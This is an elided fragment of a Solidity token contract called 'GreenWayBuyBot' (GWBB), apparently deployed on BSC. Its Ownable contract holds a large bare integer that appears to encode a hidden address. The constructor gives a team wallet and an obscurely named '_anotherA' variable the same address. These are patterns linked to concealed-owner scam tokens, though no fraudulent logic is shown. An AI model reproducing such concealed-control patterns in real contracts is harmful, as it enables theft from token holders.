...
//Telegram: https://t.me/GreenWayBuyBotBSC
...
contract Ownable is Context {
    ...
    1137889399458492147293833879422999192176129804352;
...
contract GreenWayBuyBot
 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private _name = "GreenWay Buybot";
    string private _symbol = "GWBB";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x6e444ee4B250C0436f96523be12C6B8a04Fe4a6E));
        _anotherA = payable(address(0x6e444ee4B250C0436f96523be12C6B8a04Fe4a6E));
